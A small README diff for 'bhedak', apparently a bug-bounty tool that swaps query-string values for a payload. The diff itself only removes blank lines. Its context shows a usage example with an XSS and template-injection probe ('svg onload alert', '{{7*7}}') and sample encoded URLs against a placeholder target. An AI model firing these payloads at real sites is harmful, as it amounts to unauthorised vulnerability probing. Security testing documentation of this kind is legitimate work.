@@ -41,11 +41,8 @@ $root:~ wget https://raw.githubusercontent.com/ROX4R/bhedak/main/bhedak && chmod
     $ cat urls | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
 
     http://subdomain.target.tld/comment.php?pid=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%2A%27%2F---%2B%7B%7B7%2A7%7D%7D&user=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%2A%27%2F---%2B%7B%7B7%2A7%7D%7D
-    
     http://subdomain.target.tld/disclaimer.php=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%2A%27%2F---%2B%7B%7B7%2A7%7D%7D
-    
     http://subdomain.target.tld/hpp/index.php?pp=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%2A%27%2F---%2B%7B%7B7%2A7%7D%7D
-    
     http://subdomain.target.tld/hpp/?pp=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%2A%27%2F---%2B%7B%7B7%2A7%7D%7D&user=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E%2A%27%2F---%2B%7B%7B7%2A7%7D%7D
     ```
 - **Remove duplicate urls**
